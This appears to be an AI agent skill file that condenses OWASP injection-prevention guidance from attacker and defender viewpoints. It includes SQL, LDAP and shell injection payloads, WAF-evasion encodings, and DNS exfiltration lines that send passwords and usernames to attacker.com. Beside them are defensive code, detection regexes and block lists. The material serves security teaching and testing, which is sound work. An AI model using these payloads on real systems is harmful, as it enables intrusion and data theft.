---
name: cypherlamb
description: Master the art of injection attacks and defenses across SQL, LDAP, XPath, OS commands, and network protocols. Hunt the vulnerabilities, forge the shields. Based on OWASP Injection Prevention Cheat Sheet.
---

# Injection Prevention: The Red and Blue Dance
*Based on OWASP Cheat Sheet Series*

## When to use this skill?
Invoke this knowledge when:
- Conducting penetration testing or security assessments
- Performing code review for injection vulnerabilities
- Analyzing application architecture for injection risks
- Implementing secure coding practices
- Building detection rules for injection attempts
- Threat hunting for active exploitation
- Hardening legacy applications
- Training developers on secure coding

## Core Principle
Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing data without proper authorization.

---

## The Three Application Archetypes

### A1: New Application (Greenfield)
**Red Team Perspective**: Lowest risk target if built correctly, but implementation flaws are common
**Blue Team Action**: Design with security from inception - parameterization, input validation, least privilege

### A2: Productive Open Source Application
**Red Team Perspective**: Code review opportunities, known vulnerabilities in dependencies
**Blue Team Action**: Patch regularly, implement virtual patching, fork and fix if necessary

### A3: Productive Closed Source Application  
**Red Team Perspective**: Highest value target, behavioral analysis required
**Blue Team Action**: WAF rules, runtime protection, virtual patching, vendor engagement

---

## Forms of Injection: The Exploitation Grimoire

### SQL Injection

#### Attack Classes
**Inband**: Direct data extraction via same channel
```sql
' OR '1'='1' --
' UNION SELECT username, password FROM users --
```

**Out-of-band**: Data exfiltration via secondary channels
```sql
'; EXEC xp_cmdshell('nslookup data.attacker.com') --
```

**Inferential/Blind**: Truth value inference through behavior
```sql
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) --
```

#### Testing Methodology

**Code Review Red Flags**:
- Dynamic SQL construction with string concatenation
- User input directly in queries
- Stored procedures using `sp_execute`, `execute`, or `exec`
- ORM usage without parameterization
- Search functionality with raw SQL

**Exploitation Techniques**:

*Time-Based Blind*:
```
?id=10 AND IF(version() LIKE '5%', SLEEP(10), 'false')
```
Monitor response timing to infer truth values

*Boolean-Based Blind*:
```
?id=10 AND 1=1  (returns normal)
?id=10 AND 1=2  (returns different/error)
```

*Error-Based*:
Force database errors that leak information
```sql
' AND 1=CONVERT(int, @@version) --
```

**Automated Tools**:
- SQLMap: Full automation, fingerprinting, data extraction
- Burp Suite: Manual testing with intelligent fuzzing
- SAST tools: Data flow analysis for taint tracking

#### Defense Implementation

**Prepared Statements (Primary Defense)**:
```java
String query = "SELECT balance FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userId);
ResultSet results = pstmt.executeQuery();
```

**Stored Procedures (When Implemented Safely)**:
```java
CallableStatement cs = connection.prepareCall("{call getUserBalance(?)}");
cs.setString(1, userId);
ResultSet results = cs.executeQuery();
```

**Allow-List Validation (For Structural Elements)**:
```java
// For table names, column names, ORDER BY direction
Map<String, String> validTables = Map.of("users", "user_table", "products", "product_table");
String tableName = validTables.getOrDefault(userInput, "user_table");
```

**Escaping (Last Resort Only)**:
Use database-specific escape functions, but understand this is fragile

#### Detection Signatures
- Multiple single quotes in parameters
- SQL keywords in unexpected locations
- Special characters: `'; -- /* */ xp_ sp_ UNION SELECT`
- Time delays in responses
- Database error messages in responses
- Unusual outbound DNS/HTTP requests

---

### LDAP Injection

#### Attack Pattern
```
username: *)(uid=*))(|(uid=*
password: anything
Result: Bypass authentication by breaking out of search filter
```

#### Special Characters to Test
DN Context: `\ # + < > , ; " =` plus leading/trailing spaces
Search Filter Context: `* ( ) \ NUL`

#### Defense - Escape Functions

**For DN (Distinguished Names)**:
```java
public String escapeDN(String name) {
    final char[] META_CHARS = {'+', '"', '<', '>', ';', '/'};
    String escaped = name;
    escaped = escaped.replaceAll("\\\\", "\\\\\\\\");
    escaped = escaped.replaceAll("^#", "\\\\#");
    escaped = escaped.replaceAll("^ | $", "\\\\ ");
    for (char c : META_CHARS) {
        escaped = escaped.replaceAll("\\\\" + c, "\\\\\\\\" + c);
    }
    return escaped;
}
```

**For Search Filters**:
```java
public String escapeSearchFilter(String filter) {
    String escaped = filter;
    escaped = escaped.replaceAll("\\\\", "\\\\5c");
    escaped = escaped.replaceAll("\\*", "\\\\2a");
    escaped = escaped.replaceAll("\\(", "\\\\28");
    escaped = escaped.replaceAll("\\)", "\\\\29");
    escaped = escaped.replaceAll("\u0000", "\\\\00");
    return escaped;
}
```

#### Detection Patterns
- Parentheses or asterisks in username fields
- Logical operators: `&`, `|`, `!`
- Escaped characters in LDAP queries in logs
- Authentication bypasses with wildcard searches

---

### OS Command Injection

#### Common Injection Points
```bash
# Command separators
; ls -la
& dir
| whoami
|| cat /etc/passwd

# Command substitution
`id`
$(uname -a)

# Redirection
> /tmp/output
< /etc/passwd

# Backticks and dollar signs
`cat /etc/shadow`
$(/usr/bin/id)
```

#### Testing Methodology

**Code Review**: Look for:
- `Runtime.exec()`, `ProcessBuilder` in Java
- `system()`, `exec()`, `passthru()` in PHP  
- `subprocess`, `os.system()` in Python
- `child_process.exec()` in Node.js

**Black Box Testing**:
```
# Time delay test
; sleep 10 ;
& ping -c 10 127.0.0.1 &

# Out-of-band
; nslookup $(whoami).attacker.com ;
```

#### Defense - Parameterization

**Java Safe Example**:
```java
// Separate command from arguments
ProcessBuilder pb = new ProcessBuilder("trustedCmd", "arg1", "arg2");
pb.directory(new File("trustedDir"));
Process p = pb.start();
```

**Input Validation**:
```java
// Allow-list regex for arguments (lowercase alphanumeric only, 3-10 chars)
Pattern pattern = Pattern.compile("^[a-z0-9]{3,10}$");
if (!pattern.matcher(argument).matches()) {
    throw new SecurityException("Invalid argument");
}
```

**Metacharacters to Block**:
`& | ; $ > < \` \ ! ` and whitespaces (unless explicitly allowed)

#### Detection Indicators
- Shell metacharacters in input fields
- Unusual process spawning patterns
- Network connections from unexpected processes
- File system modifications from web processes
- Commands in web server logs

---

### XPath Injection

#### Attack Pattern
```xpath
// Normal query
//users/user[username='admin' and password='pass123']

// Injection
username: ' or '1'='1
password: ' or '1'='1

// Result
//users/user[username='' or '1'='1' and password='' or '1'='1']
```

#### Defense
- Use parameterized XPath queries (if available in your library)
- Escape special characters: `'`, `"`, `<`, `>`, `&`
- Implement strict input validation
- Consider moving to JSON/SQL instead of XML storage

---

### Script Injection (eval)

#### Risk Areas
- JavaScript `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- Python `eval()`, `exec()`, `compile()`
- PHP `eval()`, `assert()`
- Ruby `eval()`, `instance_eval()`

#### Defense
- **Never** use eval on user input
- Use JSON.parse() instead of eval for JSON
- Use proper templating engines
- Implement CSP headers to prevent inline script execution

---

## The Three Sacred Rules

### Rule #1: Perform Proper Input Validation
**Red Team**: Test for validation bypass - encoding, Unicode, null bytes, truncation
**Blue Team**: Allow-list validation > Deny-list. Canonicalize before validation.

Implementation:
```java
// Allow-list for specific formats
Pattern emailPattern = Pattern.compile("^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+$");
if (!emailPattern.matcher(input).matches()) {
    reject();
}
```

### Rule #2: Use Safe APIs  
**Red Team**: Look for legacy code, custom implementations, stored procedures with dynamic SQL
**Blue Team**: Parameterized queries everywhere. ORM with safe defaults. No string concatenation.

### Rule #3: Contextually Escape User Data
**Red Team**: Test escaping functions - double encoding, Unicode normalization, null byte injection
**Blue Team**: Use language-specific escaping functions. Escape at the last possible moment before interpreter.

---

## Detection and Response

### Blue Team Monitoring

**Log Analysis Patterns**:
```regex
# SQL Injection indicators
.*(union|select|insert|update|delete|drop|create|alter).*
.*(\x27|\').*(\x6F|o|\x4F)(\x72|r|\x52).*
.*(\x3D|=).*(\x27|\').*

# Command injection
.*[;&|`$()].*
.*\.\.\/\.\.\/.* 

# LDAP injection
.*[\(\)\*&|].*
```

**WAF Rules**:
- ModSecurity Core Rule Set
- Custom rules for application-specific patterns
- Rate limiting on authentication endpoints
- Anomaly scoring for suspicious patterns

**SIEM Correlation**:
- Failed authentication + SQL errors = likely SQLi attempt
- Command execution + outbound connections = potential command injection
- Multiple 500 errors from single IP = scanning activity

### Red Team Evasion Techniques

**Encoding Bypass**:
```
# URL encoding
%27%20OR%20%271%27%3D%271
# Double encoding  
%2527%2520OR%2520%25271%2527%253D%25271
# Unicode
\u0027\u0020OR\u0020\u0027\u0031\u0027\u003D\u0027\u0031
```

**Time-Based Blind (Stealthy)**:
```sql
-- Use smaller delays, randomize timing
IF(condition, SLEEP(RAND()*2+1), 0)
```

**Out-of-Band (Network Restrictions)**:
```sql
-- DNS exfiltration
'; DECLARE @data VARCHAR(1024); SET @data=(SELECT TOP 1 password FROM users); 
EXEC('master..xp_cmdshell ''nslookup '+@data+'.attacker.com''')--
```

---

## Application Type Specific Strategies

### For New Applications (A1)
**Design Phase**:
- Threat modeling for injection vectors
- Security requirements in user stories
- Framework selection with safe defaults
- CI/CD with SAST integration

**Implementation**:
- Code templates with parameterization
- Input validation libraries
- Security champions in dev teams
- Pre-commit hooks for dangerous patterns

### For Open Source Applications (A2)
**Assessment**:
- Dependency analysis for known vulns
- Code review of high-risk modules
- Dynamic testing in staging
- Community engagement for fixes

**Hardening**:
- Fork and patch critical issues
- Upstream contribution of fixes
- Virtual patching with WAF
- Monitoring for exploitation

### For Closed Source Applications (A3)
**Black Box Testing**:
- Comprehensive fuzzing
- Behavioral analysis
- Traffic inspection
- Error message analysis

**Compensating Controls**:
- WAF with custom rules
- Runtime Application Self-Protection (RASP)
- Database activity monitoring
- Network segmentation

---

## Tools of the Trade

### Red Team Arsenal
- **SQLMap**: Automated SQL injection exploitation
- **Commix**: OS command injection exploitation
- **Burp Suite Pro**: Manual testing, intruder, scanner
- **OWASP ZAP**: Active and passive scanning
- **Custom Scripts**: Python requests, exploitation frameworks

### Blue Team Arsenal
- **SAST**: Checkmarx, Fortify, SonarQube
- **DAST**: Burp Suite Enterprise, Acunetix, Netsparker
- **WAF**: ModSecurity, AWS WAF, Cloudflare
- **RASP**: Contrast Security, Sqreen
- **Database Firewalls**: Imperva, Oracle Database Firewall

---

## The Philosophical Bridge

As one who walks both paths, remember:

**Red teaches Blue** what is possible, what is likely, what attackers actually do in the wild versus what defenders imagine.

**Blue teaches Red** what is detectable, what is sustainable in production, what risk owners actually care about.

**Together** they create the spiral dance - each push from offense driving better defense, each defensive innovation requiring offensive adaptation.

Injection vulnerabilities represent the eternal truth: *trust boundaries must be enforced through technical controls, not assumptions*. Every interpreter is a potential gateway. Every input is Schrödinger's payload - simultaneously benign and malicious until validation collapses the waveform.

---

## Quick Reference: Testing Checklist

### During Code Review
- [ ] Search for: `+`, string concatenation in queries
- [ ] Verify all user input is parameterized
- [ ] Check stored procedures for dynamic SQL
- [ ] Validate input validation is allow-list based
- [ ] Confirm escaping happens at last moment
- [ ] Review error handling (no sensitive data in errors)

### During Penetration Testing  
- [ ] Identify all input vectors (GET, POST, headers, cookies)
- [ ] Test with basic injection payloads (quotes, semicolons)
- [ ] Attempt time-based blind injection
- [ ] Try out-of-band exfiltration
- [ ] Test stored procedures if identified
- [ ] Check for second-order injection
- [ ] Verify WAF presence and test bypass
- [ ] Document all findings with proof-of-concept

### During Incident Response
- [ ] Check WAF/IDS logs for injection patterns
- [ ] Review database logs for suspicious queries
- [ ] Analyze process creation logs
- [ ] Search for unusual outbound connections
- [ ] Check for data exfiltration indicators
- [ ] Identify compromised accounts
- [ ] Determine blast radius
- [ ] Preserve evidence for forensics

---

*Source: OWASP Injection Prevention Cheat Sheet*
*Last Updated: February 2026*

**Remember**: With injection, there are no gifts - every input is an exchange, and you must know exactly what you're accepting and what could be hidden within.
